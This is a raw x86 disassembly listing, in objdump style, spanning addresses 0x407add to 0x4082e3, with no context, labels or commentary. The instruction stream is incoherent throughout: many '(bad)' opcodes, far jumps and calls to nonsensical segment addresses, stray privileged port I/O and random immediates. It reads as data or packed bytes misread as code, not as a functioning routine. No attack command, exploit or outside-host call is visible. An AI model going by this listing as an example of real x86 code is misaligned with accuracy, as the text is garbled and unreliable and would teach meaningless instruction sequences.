  407add:	dec    ebx
  407ade:	gs dec ax
  407ae1:	je     0x407a83
  407ae3:	jne    0x407b5e
  407ae5:	and    eax,0x3e348718
  407aea:	and    BYTE PTR [edi-0x10],ah
  407aed:	js     0x407aa3
  407aef:	mov    ecx,DWORD PTR [ebx]
  407af1:	retf   
  407af2:	mov    WORD PTR [ecx-0x34],ss
  407af5:	mov    ecx,0xc61ebd7e
  407afa:	das    
  407afb:	retf   0xc464
  407afe:	inc    edi
  407aff:	fist   DWORD PTR [esi-0x1807469d]
  407b05:	jmp    0x377fbb05
  407b0a:	pop    ebx
  407b0b:	pop    ebp
  407b0c:	loopne 0x407b78
  407b0e:	rcl    edi,1
  407b10:	int3   
  407b11:	pop    esp
  407b12:	inc    eax
  407b13:	in     eax,0x2b
  407b15:	and    DWORD PTR [edx+0x60603dd4],eax
  407b1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b1c:	sub    ah,ch
  407b1e:	jnp    0x407aea
  407b20:	fnstenv [ecx-0x50]
  407b23:	mov    DWORD PTR [edx-0x32],esp
  407b26:	push   cs
  407b27:	lds    ebp,FWORD PTR [eax*8-0x1e7dc885]
  407b2e:	cmp    DWORD PTR ds:0xd75242e3,ecx
  407b34:	inc    ebp
  407b35:	pop    ds
  407b36:	idiv   DWORD PTR [edi]
  407b38:	add    ebp,DWORD PTR [edx+0x535c331a]
  407b3e:	out    dx,eax
  407b3f:	in     eax,0x1f
  407b41:	ss int3 
  407b43:	inc    ebx
  407b44:	enter  0x3962,0xdf
  407b48:	jae    0x407b5f
  407b4a:	cs daa 
  407b4c:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  407b4e:	xor    dl,BYTE PTR [ebx+0x4c5aa480]
  407b54:	xchg   esp,eax
  407b55:	dec    eax
  407b56:	nop
  407b57:	out    dx,al
  407b58:	sbb    al,0x9b
  407b5a:	xor    cl,BYTE PTR [eax]
  407b5c:	adc    BYTE PTR [ebx],dh
  407b5e:	in     al,0xfa
  407b60:	sbb    ch,0xc5
  407b63:	fdivr  QWORD PTR [eax+eiz*1]
  407b66:	jmp    0x274f838b
  407b6b:	or     BYTE PTR es:[ecx+0x1b],dh
  407b6f:	shr    DWORD PTR [edx-0x7d],0xaa
  407b73:	jns    0x407bbd
  407b75:	js     0x407bdc
  407b77:	xchg   esp,eax
  407b78:	fld    DWORD PTR ds:0x9aca9018
  407b7e:	push   ebp
  407b7f:	(bad)  
  407b80:	cmp    al,0x1e
  407b82:	and    eax,0xfa56fa86
  407b87:	sbb    BYTE PTR [esp+eiz*8-0x1f857ede],0x6c
  407b8f:	(bad)  
  407b90:	cwde   
  407b91:	mov    eax,0xc43b735f
  407b96:	mov    ch,0x21
  407b98:	loopne 0x407b9d
  407b9a:	push   eax
  407b9b:	imul   edi,ebx,0x7b
  407b9e:	(bad)  
  407b9f:	into   
  407ba0:	sub    DWORD PTR [ebp-0x79],0x64c1b86a
  407ba7:	fisub  WORD PTR [edx+edx*2-0x72]
  407bab:	out    0x26,al
  407bad:	jno    0x407c08
  407baf:	sbb    DWORD PTR [edi+eax*8+0x2ad26616],esp
  407bb6:	jmp    0xaecc:0x2df8a012
  407bbd:	adc    al,0xf2
  407bbf:	sub    ch,BYTE PTR [edx-0x5b]
  407bc2:	inc    ebp
  407bc3:	stos   BYTE PTR es:[edi],al
  407bc4:	inc    esi
  407bc5:	push   esi
  407bc6:	add    esp,DWORD PTR [ecx+0x65]
  407bc9:	cmp    eax,0xd494c0db
  407bce:	mov    ebp,0x7d18cbb
  407bd3:	push   edi
  407bd4:	mov    eax,0x2dfd61a1
  407bd9:	sub    ebx,DWORD PTR [edi-0x79622fe]
  407bdf:	pusha  
  407be0:	xchg   DWORD PTR [ecx],ebp
  407be2:	cs mov cl,0x8
  407be5:	inc    eax
  407be6:	loopne 0x407b74
  407be8:	mov    dl,0xcb
  407bea:	jle    0x407c62
  407bec:	scas   al,BYTE PTR es:[edi]
  407bed:	dec    ecx
  407bee:	jmp    0xf924bf07
  407bf3:	inc    eax
  407bf4:	push   0x2830ee94
  407bf9:	fdivr  st(0),st
  407bfb:	icebp  
  407bfc:	clc    
  407bfd:	and    eax,0xf817636e
  407c03:	mov    esi,0xc1444e83
  407c08:	jns    0x407beb
  407c0a:	out    dx,eax
  407c0b:	jo     0x407c27
  407c0d:	cs pushf 
  407c0f:	xchg   ecx,eax
  407c10:	addr16 and al,0x2
  407c13:	test   eax,0x89e28b5d
  407c18:	pop    edx
  407c19:	ret    
  407c1a:	fadd   QWORD PTR [edx+0x40a6c395]
  407c20:	mov    esp,0xf34d8f57
  407c25:	jo     0x407c99
  407c27:	mov    ch,dl
  407c29:	jge    0x407c23
  407c2b:	pop    eax
  407c2c:	imul   esi,DWORD PTR [ebp+0x53],0xffffff88
  407c30:	out    dx,al
  407c31:	outs   dx,DWORD PTR ds:[esi]
  407c32:	mov    edi,0x718b5cbb
  407c37:	mov    ?,WORD PTR [esi]
  407c39:	sbb    al,0xdd
  407c3b:	jbe    0x407cb3
  407c3d:	fwait
  407c3e:	jmp    0xed49:0x9227e553
  407c45:	adc    dh,BYTE PTR [eax]
  407c47:	fld    TBYTE PTR [ecx+0x3d38a4e6]
  407c4d:	cwde   
  407c4e:	mov    ebx,0xe71cdae3
  407c53:	gs jg  0x407bf6
  407c56:	aaa    
  407c57:	add    DWORD PTR [ebx+0x38],esp
  407c5a:	mov    esp,0x63657bb2
  407c5f:	iret   
  407c60:	add    BYTE PTR [esi+0x16],cl
  407c63:	mov    ecx,0x55e426dc
  407c68:	push   ebp
  407c69:	push   ebx
  407c6a:	scas   al,BYTE PTR es:[edi]
  407c6b:	int3   
  407c6c:	jno    0x407c7c
  407c6e:	int    0xf9
  407c70:	adc    BYTE PTR [edi-0x43],cl
  407c73:	imul   edi,DWORD PTR [ecx],0x91074d8b
  407c79:	out    dx,eax
  407c7a:	xor    bl,BYTE PTR [edi+0x1f3b66e6]
  407c80:	ret    
  407c81:	inc    esp
  407c82:	mov    edi,0x90a532d9
  407c87:	lea    edi,[edi+0x3f7e2568]
  407c8d:	push   ecx
  407c8e:	push   ss
  407c8f:	dec    edi
  407c90:	adc    BYTE PTR [esi+0x53c0b0c2],bl
  407c96:	mov    ch,BYTE PTR [ecx]
  407c98:	pusha  
  407c99:	pop    ebp
  407c9a:	iret   
  407c9b:	inc    ebp
  407c9c:	mov    DWORD PTR [eax-0x6b52bcb7],eax
  407ca2:	call   0x4a29:0xb278
  407ca8:	(bad)  
  407ca9:	out    dx,al
  407caa:	and    ecx,ebx
  407cac:	or     BYTE PTR [edi-0x5750a93c],al
  407cb2:	xor    DWORD PTR [edx],ebp
  407cb4:	add    al,0x46
  407cb6:	cld    
  407cb7:	inc    eax
  407cb8:	push   esi
  407cb9:	hlt    
  407cba:	sub    edx,DWORD PTR [edx-0xf]
  407cbd:	cld    
  407cbe:	push   ds
  407cbf:	sahf   
  407cc0:	jp     0x407c69
  407cc2:	mov    WORD PTR [esp+ecx*4],cs
  407cc5:	inc    ebp
  407cc6:	test   DWORD PTR [edi-0x763be017],edi
  407ccc:	mov    ebp,0x3d9b5739
  407cd1:	scas   eax,DWORD PTR es:[edi]
  407cd2:	hlt    
  407cd3:	test   eax,0x65e644eb
  407cd8:	ja     0x407d1e
  407cda:	mov    dh,BYTE PTR [eax+0x64332317]
  407ce0:	or     ebx,ebp
  407ce2:	xor    al,0x56
  407ce4:	mov    cs,WORD PTR [esi-0x71a91673]
  407cea:	scas   al,BYTE PTR es:[edi]
  407ceb:	sub    ebp,ebp
  407ced:	sub    eax,DWORD PTR [ecx+0x29]
  407cf0:	push   ebp
  407cf1:	jbe    0x407c91
  407cf3:	in     eax,0x77
  407cf5:	cmp    esp,DWORD PTR [edi-0x48]
  407cf8:	aam    0x7d
  407cfa:	imul   eax,DWORD PTR [ecx-0x18],0xffffff9f
  407cfe:	fwait
  407cff:	loope  0x407d39
  407d01:	out    dx,al
  407d02:	stos   BYTE PTR es:[edi],al
  407d03:	jmp    0x407cee
  407d05:	fs loop 0x407d51
  407d08:	fcmovb st,st(7)
  407d0a:	test   DWORD PTR [edi+0x3805c93b],eax
  407d10:	and    DWORD PTR [esi*2+0x452dfdf6],ecx
  407d17:	adc    edx,ebx
  407d19:	sub    ah,BYTE PTR [ebx]
  407d1b:	mov    ah,0x9e
  407d1d:	into   
  407d1e:	sub    al,BYTE PTR [eax-0x61]
  407d21:	lock call 0x562a:0xe5616561
  407d29:	cmp    eax,DWORD PTR [ecx]
  407d2b:	jne    0x407d36
  407d2d:	fistp  WORD PTR [eax]
  407d2f:	retf   0xaecb
  407d32:	adc    eax,0xffdda0b
  407d37:	jns    0x407cba
  407d39:	fs ja  0x407d96
  407d3c:	ret    0xa37e
  407d3f:	add    cl,ah
  407d41:	lods   eax,DWORD PTR ds:[esi]
  407d42:	or     BYTE PTR es:[ebp+0x18],bh
  407d46:	je     0x407d68
  407d48:	ins    BYTE PTR es:[edi],dx
  407d49:	jns    0x407d8c
  407d4b:	jp     0x407dab
  407d4d:	xor    DWORD PTR [esi],ecx
  407d4f:	cmc    
  407d50:	inc    eax
  407d51:	xchg   esi,eax
  407d52:	sbb    al,0x97
  407d54:	mov    ds:0xf5e268f5,eax
  407d59:	push   cs
  407d5a:	add    al,0xad
  407d5c:	cdq    
  407d5d:	hlt    
  407d5e:	fisub  DWORD PTR [edi+0x14]
  407d61:	(bad)  
  407d62:	ror    DWORD PTR [eax+0x2c],0xf2
  407d66:	test   al,0x39
  407d68:	push   ecx
  407d69:	es xchg ebp,eax
  407d6b:	fwait
  407d6c:	adc    eax,0x4ca6d094
  407d71:	(bad)  
  407d72:	cdq    
  407d73:	mov    dl,0xaa
  407d75:	mov    es,eax
  407d77:	data16 arpl WORD PTR [edx],dx
  407d7a:	add    eax,0x4c6ba868
  407d7f:	jp     0x407d97
  407d81:	(bad)  
  407d82:	mov    edx,0x2eea982
  407d87:	out    0x74,al
  407d89:	popf   
  407d8a:	sub    BYTE PTR [ebp+esi*8+0x6a],dh
  407d8e:	call   0x8a30f0d4
  407d93:	outs   dx,DWORD PTR ds:[esi]
  407d94:	clc    
  407d95:	add    eax,0x59af7557
  407d9a:	inc    ecx
  407d9b:	xchg   ebp,eax
  407d9c:	cmp    dh,dl
  407d9e:	inc    esp
  407d9f:	or     esi,edx
  407da1:	std    
  407da2:	or     BYTE PTR ds:0xf00ee4c7,al
  407da8:	call   0x9da7:0xa2b42f5e
  407daf:	sbb    eax,DWORD PTR [ebx+0x4e]
  407db2:	mov    fs,WORD PTR [ebx-0x23a85c99]
  407db8:	mov    cl,ah
  407dba:	dec    ebp
  407dbb:	mov    eax,0xaf05db77
  407dc0:	fist   DWORD PTR [edi-0x69229a48]
  407dc6:	and    eax,0x3d3bc865
  407dcb:	rcr    DWORD PTR [ebx-0x2b],0xcf
  407dcf:	outs   dx,BYTE PTR ds:[esi]
  407dd0:	sbb    dh,BYTE PTR [edx]
  407dd2:	xchg   ebx,eax
  407dd3:	cld    
  407dd4:	or     eax,0xe0ca8cc9
  407dd9:	fwait
  407dda:	add    al,0xd6
  407ddc:	js     0x407dc6
  407dde:	adc    esi,eax
  407de0:	ss loopne 0x407e61
  407de3:	sub    al,0x80
  407de5:	xor    bl,BYTE PTR [edx+edi*2]
  407de8:	xor    edx,DWORD PTR [edx-0x22161b47]
  407dee:	mov    esp,0x3da3e92
  407df3:	fcomp  DWORD PTR [eax]
  407df5:	bound  ebp,QWORD PTR [eax]
  407df7:	push   0xe973518d
  407dfc:	repnz adc esi,DWORD PTR [eax]
  407dff:	enter  0xe3f1,0xba
  407e03:	rcl    DWORD PTR [eax+0x1f286874],cl
  407e09:	repnz fisub WORD PTR [edi+0xd]
  407e0d:	mov    edi,0xb5f280cd
  407e12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e13:	test   BYTE PTR [edi+0x2398848a],0x19
  407e1a:	popf   
  407e1b:	fldcw  WORD PTR [ebp-0x3f]
  407e1e:	pop    esp
  407e1f:	mov    al,ds:0x397d6324
  407e24:	cmp    eax,edi
  407e26:	sub    DWORD PTR [eax+esi*1-0x5fc93f3f],ecx
  407e2d:	mov    DWORD PTR [ebx+0x4e5dfe58],esp
  407e33:	cmp    al,0xaf
  407e35:	xchg   edi,eax
  407e36:	or     BYTE PTR [eax],ah
  407e38:	pop    ds
  407e39:	out    0xa5,al
  407e3b:	sub    esp,DWORD PTR [ecx]
  407e3d:	rcl    BYTE PTR [ebp+0x60],1
  407e40:	lds    esp,FWORD PTR [edx]
  407e42:	fistp  WORD PTR [edx+0x600d3fc]
  407e48:	aaa    
  407e49:	xor    BYTE PTR [eax+0xf],al
  407e4c:	ins    DWORD PTR es:[edi],dx
  407e4d:	arpl   WORD PTR [eax-0x1b],di
  407e50:	cmp    bh,bh
  407e52:	imul   eax,edi,0x2d
  407e55:	dec    esp
  407e56:	mov    esi,0xb899ba53
  407e5b:	enter  0xad58,0x67
  407e5f:	fs into 
  407e61:	mov    cs,WORD PTR [esi-0x28]
  407e64:	cwde   
  407e65:	dec    edx
  407e66:	xor    BYTE PTR [edi],cl
  407e68:	xor    ah,al
  407e6a:	retf   
  407e6b:	mov    ebp,0x399eab1e
  407e70:	push   ebp
  407e71:	sub    edx,DWORD PTR [ecx]
  407e73:	push   cs
  407e74:	pop    edi
  407e75:	mov    edi,DWORD PTR [ebx]
  407e77:	pop    edx
  407e78:	inc    ebx
  407e79:	lods   eax,DWORD PTR ds:[esi]
  407e7a:	adc    DWORD PTR [edi+0x29c616ba],esp
  407e80:	(bad)  
  407e81:	xchg   esp,eax
  407e82:	push   esi
  407e83:	shl    DWORD PTR [ebx+esi*4-0xb],0x8
  407e88:	xchg   ecx,eax
  407e89:	lock ret 0x943d
  407e8d:	pop    esp
  407e8e:	jae    0x407e3f
  407e90:	push   esp
  407e91:	mov    eax,ds:0x2e1b9e52
  407e96:	es and eax,0x20c6a98
  407e9c:	jmp    0xb4c6d69c
  407ea1:	cld    
  407ea2:	cwde   
  407ea3:	and    al,0xb3
  407ea5:	jle    0x407e2d
  407ea7:	les    edi,FWORD PTR [edx-0x47]
  407eaa:	lea    ebp,[ecx]
  407eac:	jg     0x407f12
  407eae:	mov    dl,0x9a
  407eb0:	mov    eax,0xc2c1efc
  407eb5:	push   ss
  407eb6:	inc    eax
  407eb7:	js     0x407eea
  407eb9:	and    al,0xb9
  407ebb:	xchg   esp,eax
  407ebc:	cmp    bh,BYTE PTR [esi+edx*4]
  407ebf:	mov    ebp,0x727f6b16
  407ec4:	xchg   cl,dh
  407ec6:	mov    BYTE PTR [ecx-0x39375a82],dh
  407ecc:	lock jne 0x407ec2
  407ecf:	nop
  407ed0:	ret    
  407ed1:	aaa    
  407ed2:	xor    cl,BYTE PTR [edx+0x24cf05e6]
  407ed8:	inc    ebx
  407ed9:	es xor al,0x32
  407edc:	loopne 0x407ecc
  407ede:	jl     0x407f2e
  407ee0:	cmp    al,0xb
  407ee2:	mov    esi,0xda469a7c
  407ee7:	and    al,0xaf
  407ee9:	jbe    0x407e92
  407eeb:	or     ah,BYTE PTR [esi-0x13]
  407eee:	mov    ds:0xf1f042b5,eax
  407ef3:	daa    
  407ef4:	push   eax
  407ef5:	cmp    ecx,DWORD PTR [eax]
  407ef7:	fwait
  407ef8:	je     0x407f0e
  407efa:	jp     0x407e9a
  407efc:	in     eax,0x18
  407efe:	fstp   DWORD PTR [edx]
  407f00:	lock fnsave [ebx+0x5769fec7]
  407f07:	or     DWORD PTR [edi+ebp*1-0x272d4689],edx
  407f0e:	aas    
  407f0f:	sti    
  407f10:	inc    ecx
  407f11:	aaa    
  407f12:	fwait
  407f13:	xor    BYTE PTR [edx-0x4a],al
  407f16:	lea    esp,[eax+edi*4+0x65]
  407f1a:	push   edx
  407f1b:	or     ebx,esi
  407f1d:	mov    ds:0x80c1459c,al
  407f22:	(bad)  [ebp-0x74]
  407f25:	xchg   ebp,eax
  407f26:	fwait
  407f27:	cmp    eax,0x33140bf5
  407f2c:	cmp    ecx,esp
  407f2e:	xchg   edi,eax
  407f2f:	xchg   esp,eax
  407f31:	cmp    DWORD PTR [edi-0x283f4595],edx
  407f37:	jb     0x407fa8
  407f39:	jne    0x407faf
  407f3b:	pop    ss
  407f3c:	mov    ds:0x631de28c,eax
  407f41:	stos   BYTE PTR es:[edi],al
  407f42:	test   al,0x4a
  407f44:	div    BYTE PTR [esi]
  407f46:	clc    
  407f47:	fs stos BYTE PTR es:[edi],al
  407f49:	xor    al,0xec
  407f4b:	cmc    
  407f4c:	inc    esi
  407f4d:	fwait
  407f4e:	stc    
  407f4f:	imul   edx,DWORD PTR ds:0xe27a09e,0x198fd16
  407f59:	adc    BYTE PTR [ecx-0x17634ef5],dh
  407f5f:	rol    BYTE PTR [esi+0x19],0xbc
  407f63:	mov    eax,0xc2661b0c
  407f68:	adc    dh,BYTE PTR [esi+eiz*8+0x78]
  407f6c:	jecxz  0x407f70
  407f6e:	cli    
  407f6f:	push   eax
  407f70:	in     al,dx
  407f71:	push   es
  407f72:	adc    edx,ebp
  407f74:	xor    ecx,ebp
  407f76:	jg     0x407f7a
  407f78:	cdq    
  407f79:	ins    DWORD PTR es:[edi],dx
  407f7a:	test   DWORD PTR [ecx-0x12],0x837fc279
  407f81:	ins    BYTE PTR es:[edi],dx
  407f82:	cmp    edi,DWORD PTR [ecx+0x66]
  407f85:	imul   edx,DWORD PTR [esi+0x77],0x30
  407f89:	xor    eax,0x8fc71536
  407f8e:	push   0xffffffdc
  407f90:	cmp    DWORD PTR [esi],eax
  407f92:	(bad)  
  407f93:	push   ebp
  407f94:	fcom   QWORD PTR [edx]
  407f96:	mov    ds:0x6558410c,eax
  407f9b:	and    al,0x5b
  407f9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f9e:	test   BYTE PTR [esi-0x2a],bh
  407fa1:	icebp  
  407fa2:	ja     0x407fd3
  407fa4:	adc    DWORD PTR [ebp-0x4d],ebp
  407fa7:	cdq    
  407fa8:	cmp    BYTE PTR [eax+0x75c76446],cl
  407fae:	mov    bh,0xd4
  407fb0:	pop    ss
  407fb1:	scas   eax,DWORD PTR es:[edi]
  407fb2:	imul   edx,DWORD PTR [edi-0x35],0xbea3c1cc
  407fb9:	adc    eax,0x7d636a5e
  407fbe:	dec    esi
  407fbf:	mov    DWORD PTR [esi+esi*4+0x40],edx
  407fc3:	lods   eax,DWORD PTR ds:[esi]
  407fc4:	aam    0x56
  407fc6:	sub    ebp,DWORD PTR [esi+0x5a20812f]
  407fcc:	in     al,0x68
  407fce:	cli    
  407fcf:	nop
  407fd0:	in     al,0xc1
  407fd2:	imul   esp,DWORD PTR [edi-0x5e16afff],0xffffffca
  407fd9:	push   cs
  407fda:	mov    ds:0xaf8e00ff,eax
  407fdf:	scas   al,BYTE PTR es:[edi]
  407fe0:	mov    bl,0xaa
  407fe2:	xor    ch,bl
  407fe4:	je     0x407f80
  407fe6:	push   esi
  407fe7:	inc    esi
  407fe8:	sti    
  407fe9:	mov    ch,0x40
  407feb:	dec    ecx
  407fec:	aas    
  407fed:	mov    fs,WORD PTR [edx-0x6b]
  407ff0:	sub    DWORD PTR [ebp+0x6d],ebx
  407ff3:	push   0x4ee7b44b
  407ff8:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  407ffa:	daa    
  407ffb:	cmp    al,0x7d
  407ffe:	xlat   BYTE PTR ds:[ebx]
  407fff:	lods   al,BYTE PTR ds:[esi]
  408000:	dec    ecx
  408001:	cdq    
  408002:	mov    dl,0xd4
  408004:	jmp    0xafc3:0x93382d66
  40800b:	cmp    BYTE PTR fs:[edi-0x6f938f38],0xb6
  408013:	push   edi
  408014:	inc    edx
  408015:	(bad)  
  408016:	imul   esp,DWORD PTR [ebx+0x553f3427],0xffffffe4
  40801d:	pop    esp
  40801e:	mov    ecx,0xe92e04ed
  408023:	xor    cl,BYTE PTR [ebx]
  408025:	test   DWORD PTR [ecx-0xb182ea6],edi
  40802b:	leave  
  40802c:	adc    BYTE PTR ds:0x19f1e51e,0x45
  408033:	cmp    dh,ch
  408035:	mov    eax,ds:0xfe1872cb
  40803a:	pop    ss
  40803b:	scas   al,BYTE PTR es:[edi]
  40803c:	jmp    0x408087
  40803e:	dec    esp
  40803f:	je     0x40804f
  408041:	sub    DWORD PTR [edi+eax*4-0x9],0xeaa27c97
  408049:	(bad)  
  40804a:	xchg   ebp,eax
  40804b:	xchg   DWORD PTR [eax],ebp
  40804d:	(bad)  
  40804f:	bound  esi,QWORD PTR [esi+0x7d]
  408052:	lds    ebx,FWORD PTR [edx+0x48c6ae65]
  408058:	icebp  
  408059:	jbe    0x4080ba
  40805b:	sub    esp,edi
  40805d:	fs in  eax,0x2
  408060:	jmp    0x5054:0x432986fe
  408067:	sbb    al,0x5
  408069:	inc    edx
  40806a:	or     bh,0x36
  40806d:	fist   DWORD PTR [ecx-0xa]
  408070:	jg     0x408045
  408072:	ss mov ebx,0xe37ed0ef
  408078:	je     0x408046
  40807a:	mov    esp,0x69ea908b
  40807f:	ficomp WORD PTR [edi]
  408081:	(bad)  
  408083:	or     al,0xe4
  408085:	into   
  408086:	test   bh,0x29
  408089:	lds    edi,FWORD PTR [edx]
  40808b:	cli    
  40808c:	adc    BYTE PTR [edx-0x23378148],dl
  408092:	xchg   edx,eax
  408093:	push   edx
  408094:	cmp    BYTE PTR [edx-0x31829500],ch
  40809a:	push   eax
  40809b:	rcl    ch,0xd8
  40809e:	mov    DWORD PTR [ebx-0x51],eax
  4080a1:	xchg   edx,eax
  4080a2:	add    esi,DWORD PTR [eax-0x73adccf9]
  4080a8:	stos   DWORD PTR es:[edi],eax
  4080a9:	sub    ah,BYTE PTR [ebp+0x1ffb3433]
  4080af:	jmp    0x40810f
  4080b1:	(bad)  
  4080b2:	cmp    dh,ah
  4080b4:	jae    0x40810b
  4080b6:	cmp    bh,BYTE PTR [ebx-0x4b]
  4080b9:	in     eax,0x48
  4080bb:	inc    eax
  4080bc:	addr16 sub al,0xfb
  4080bf:	add    eax,0x45e2bf79
  4080c4:	fsub   QWORD PTR [ebx-0x14960061]
  4080ca:	push   ss
  4080cb:	shl    BYTE PTR [ebx+0x2fdcb83c],1
  4080d1:	inc    esp
  4080d2:	sub    DWORD PTR [eax-0x4f],edx
  4080d5:	imul   edx,DWORD PTR [esi],0xb93dc8dd
  4080db:	jle    0x408145
  4080dd:	pop    edi
  4080de:	lock pop DWORD PTR [edx]
  4080e1:	mov    ?,WORD PTR [ecx-0x5982d15f]
  4080e7:	test   eax,0x579d7b47
  4080ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080ed:	push   ebx
  4080ee:	sub    edx,DWORD PTR [edi-0x36283db5]
  4080f4:	ins    DWORD PTR es:[edi],dx
  4080f5:	jle    0x40808e
  4080f7:	fs cli 
  4080f9:	das    
  4080fa:	jp     0x40808f
  4080fc:	push   eax
  4080fd:	test   DWORD PTR [ebp+edi*8-0x7e0fe422],ebx
  408104:	sbb    BYTE PTR [esi-0xa4db55f],ch
  40810a:	test   DWORD PTR [esi-0xd],0xfed4025f
  408111:	retf   0xb2a3
  408114:	jl     0x40817f
  408116:	cmc    
  408117:	ret    0x4302
  40811a:	ret    0x5ecd
  40811d:	dec    ecx
  40811e:	je     0x40814e
  408120:	or     DWORD PTR [edx-0x71281d3e],esp
  408126:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408127:	imul   esp,DWORD PTR ds:0x128337fd,0x1a2907ca
  408131:	fwait
  408132:	sub    al,0x53
  408134:	inc    esi
  408135:	mov    ah,al
  408137:	outs   dx,BYTE PTR ds:[esi]
  408138:	pop    ebx
  408139:	(bad)  
  40813a:	cmc    
  40813b:	sbb    esp,esp
  40813d:	dec    ebp
  40813e:	loope  0x408126
  408140:	pusha  
  408141:	jo     0x408152
  408143:	mov    ebp,0x194dbb59
  408148:	push   ecx
  408149:	mov    BYTE PTR [edi+0x0],dh
  40814c:	rcr    al,1
  40814e:	clc    
  40814f:	cmp    BYTE PTR [edi],cl
  408151:	adc    al,0xa9
  408153:	lods   al,BYTE PTR ds:[esi]
  408154:	retf   0x76ee
  408157:	jp     0x408158
  408159:	xchg   ebp,eax
  40815a:	sar    ebp,1
  40815c:	imul   edx,DWORD PTR [edi-0x636e91f6],0x116bfd94
  408166:	int    0x17
  408168:	sbb    eax,0x1060b677
  40816d:	pop    ebp
  40816e:	xchg   esp,eax
  40816f:	bound  eax,QWORD PTR [edx]
  408171:	xor    al,0x97
  408173:	int3   
  408174:	pop    edi
  408175:	pop    edi
  408176:	outs   dx,BYTE PTR ds:[esi]
  408177:	jge    0x408162
  408179:	outs   dx,DWORD PTR ds:[esi]
  40817a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40817b:	mov    esp,0xd04203e
  408180:	sub    al,0x41
  408182:	mov    dh,0xd
  408184:	add    DWORD PTR [eax-0x28a6e8f3],ecx
  40818a:	mov    eax,0x8e7c49f4
  40818f:	push   esi
  408190:	test   al,0x44
  408192:	scas   eax,DWORD PTR es:[edi]
  408193:	ins    DWORD PTR es:[edi],dx
  408194:	arpl   WORD PTR [ecx-0x2e08ef88],cx
  40819a:	mov    bl,BYTE PTR [ebp+0x6e]
  40819d:	sbb    eax,0xdb0bc83c
  4081a2:	test   cl,dh
  4081a4:	pop    edi
  4081a5:	in     eax,dx
  4081a6:	and    BYTE PTR [edi-0x46a6b020],dh
  4081ac:	push   ecx
  4081ad:	inc    ebx
  4081ae:	call   0xa7d3:0xb9d3da6b
  4081b5:	mov    eax,ds:0x79d3f0a4
  4081ba:	adc    ah,BYTE PTR [bp+0x1a]
  4081be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081bf:	test   DWORD PTR [esi],ebx
  4081c1:	rcl    DWORD PTR [esi-0x59],0x56
  4081c5:	push   esp
  4081c6:	xor    BYTE PTR [ecx+0x78912e25],cl
  4081cc:	adc    BYTE PTR [ecx-0x80],al
  4081cf:	sub    DWORD PTR [esi-0x6f29d47b],ebx
  4081d5:	mov    DWORD PTR [eax+0x2],esi
  4081d8:	jmp    0x40823f
  4081da:	push   0xffffffa5
  4081dc:	mov    esi,0xc72c23a4
  4081e1:	(bad)  
  4081e2:	cmp    DWORD PTR [ebx-0x19],esp
  4081e5:	in     al,0xa9
  4081e7:	inc    esi
  4081e8:	dec    ecx
  4081ea:	jmp    0x777b8c31
  4081ef:	sbb    DWORD PTR [bx+di],esi
  4081f2:	pop    ebx
  4081f3:	dec    eax
  4081f4:	pop    ebx
  4081f5:	fsub   DWORD PTR [ebx+0x6b]
  4081f8:	lock sub bh,BYTE PTR [edx-0x483ce5a2]
  4081ff:	imul   esi,esi,0xf901ac8d
  408205:	lock mov ch,0xfc
  408208:	and    ah,BYTE PTR [ebp+0x3a]
  40820b:	jge    0x40826b
  40820d:	rol    DWORD PTR [esp+edx*2-0x41],0x74
  408212:	ss lahf 
  408214:	mov    bh,0xf0
  408216:	pop    ss
  408217:	mov    al,ds:0x12124926
  40821c:	jmp    0xab89:0x71fdcf74
  408223:	mov    edi,0xec1d3809
  408228:	fs inc ebp
  40822a:	push   ebp
  40822b:	xor    BYTE PTR [edx+0x44],al
  40822e:	bound  esi,QWORD PTR [edi-0x5e89fa60]
  408234:	ja     0x40824f
  408236:	rol    ebp,1
  408238:	test   al,0xab
  40823a:	mov    eax,0x2c192b5a
  40823f:	xchg   ebp,eax
  408240:	sbb    dh,0xf0
  408243:	and    BYTE PTR ds:0x6fdffe1a,cl
  408249:	in     eax,dx
  40824a:	mov    esi,0x2e112770
  40824f:	jae    0x408211
  408251:	and    ch,bl
  408253:	dec    esi
  408254:	add    DWORD PTR [ebx+0x25],0xffffffe8
  408258:	call   0xa031:0x279befa6
  40825f:	pop    esp
  408260:	fcmovnbe st,st(1)
  408262:	push   ecx
  408263:	mov    edi,0x358d29e1
  408268:	shl    esp,cl
  40826a:	xor    eax,0xd9f8142e
  40826f:	push   es
  408270:	jns    0x408231
  408272:	in     al,0x15
  408274:	aam    0x3f
  408276:	jle    0x4082f3
  408278:	inc    ebp
  408279:	mov    BYTE PTR [ebp-0x34295092],al
  40827f:	ja     0x408256
  408281:	icebp  
  408282:	adc    BYTE PTR [eax+0x2f09cd8d],ah
  408288:	jle    0x408274
  40828a:	mov    dh,0x40
  40828c:	out    0x85,eax
  40828e:	lea    esi,[edx]
  408290:	iret   
  408291:	mov    dl,0xf2
  408293:	xor    bl,BYTE PTR [ecx+0x78]
  408296:	loop   0x408247
  408298:	enter  0xb25c,0x6f
  40829c:	sub    BYTE PTR [edx+edi*1+0x201dfef9],ch
  4082a3:	fs scas eax,DWORD PTR es:[edi]
  4082a5:	hlt    
  4082a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082a7:	sbb    eax,0x76fe069e
  4082ac:	pop    esi
  4082ad:	lods   eax,DWORD PTR ds:[esi]
  4082ae:	adc    DWORD PTR [ecx+esi*1],eax
  4082b1:	push   edi
  4082b2:	push   0x6b
  4082b4:	push   0xfe3868ba
  4082b9:	jo     0x4082da
  4082bb:	rcl    DWORD PTR [ecx-0x1a562b1f],1
  4082c1:	xor    eax,0xef9a37c1
  4082c6:	sbb    BYTE PTR [eax+0x779e2e0a],dh
  4082cc:	ror    BYTE PTR ds:[esi-0x4a],1
  4082d0:	std    
  4082d1:	mov    dl,0x4c
  4082d3:	sahf   
  4082d4:	lea    ecx,[edi-0x6fb3bc2f]
  4082da:	fcomp  DWORD PTR [esi]
  4082dc:	lahf   
  4082dd:	(bad)  
  4082de:	mov    eax,ds:0x828878be
  4082e3:	lock sbb DWORD PTR [edx+edx*2],eax
